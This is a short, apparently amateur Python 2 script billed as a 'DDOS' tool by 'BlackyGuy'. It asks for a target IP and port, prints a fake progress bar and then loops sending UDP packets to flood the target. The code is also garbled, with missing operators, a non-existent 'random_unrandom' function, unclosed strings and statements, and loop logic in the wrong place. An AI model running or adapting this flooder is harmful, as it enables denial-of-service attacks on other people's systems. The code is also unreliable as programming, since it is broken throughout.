import sys
import os
import time
import socket 
import random
#Code Time
from datetime import datetime 
now datetime.now()
hour = now.hour
minute = now.minute
day = now.day 
month = now.month 
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random_unrandom(1499)
#############

os.system("clear")
os.system("localhost DDOS")
print
print "Author  : BlackyGuy"
print "Team    : Localhost
print
ip = raw_input("Target IP : ")
port = input("Enter Port  : ")

os.system("clear")
os.system("DDOS localhost")
print "[+]--              [+] 0% "
time.sleep(2)
print "[+]-xxxx>          [+] 25% "
time.sleep(2)
print "[+]xxxxxxx>        [+] 50% "
time.sleep(3)
print "[+]xxxxxxxxx>      [+] 75% "
time.sleep(3)
print "[+]xxxxxxxxxxxxxx> [+] 100% "
sent = 0
while true:
  sock.sendto(bytes, (ip,port))
sent = sent + 1
sent = port + 1
print"BlackyGuy :-sent %s packet to %s throught port:%s"%(sent,ip,port)
if port == 65534

